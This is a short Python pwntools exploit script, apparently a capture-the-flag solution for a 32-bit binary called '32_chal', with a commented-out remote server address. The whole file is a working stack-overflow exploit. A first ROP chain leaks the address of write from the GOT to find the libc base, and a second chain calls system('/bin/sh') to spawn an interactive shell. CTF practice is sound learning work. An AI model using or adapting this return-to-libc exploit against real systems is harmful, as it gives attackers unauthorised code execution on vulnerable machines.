# coding: utf-8
from pwn import *

p = process('./32_chal')
#p = remote('163.172.176.29',9036)
#gdb.attach(p)


print p.recvline()
b = ELF('./32_chal')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')
context.arch = 'i386'

#leak libc
main_addr = 0x804847d
off = 0x6c
#write(1, addr_write_plt, 4)
#return to main
rop = p32(b.plt['write'])
rop += p32(main_addr)
rop += p32(0x1)
rop += p32(b.got['write'])
rop += p32(4)

payload = 'A'*off + p32(0x804a100) + rop
p.sendline(payload)

p.recvuntil('\x00')
write_leak = u32(p.recv(4))
libc_base = write_leak-libc.symbols['write']
print "Write at: {}".format(hex(write_leak))
print "Libc_base at: {}".format(hex(libc_base))

#spawn a shell
libc.address = libc_base
rop = ROP(libc)
rop.system(next(libc.search('/bin/sh\x00')))
rop.dump()
payload = 'A'*(off-4) + str(rop)
print p.recvline()
p.sendline(payload)
p.interactive()
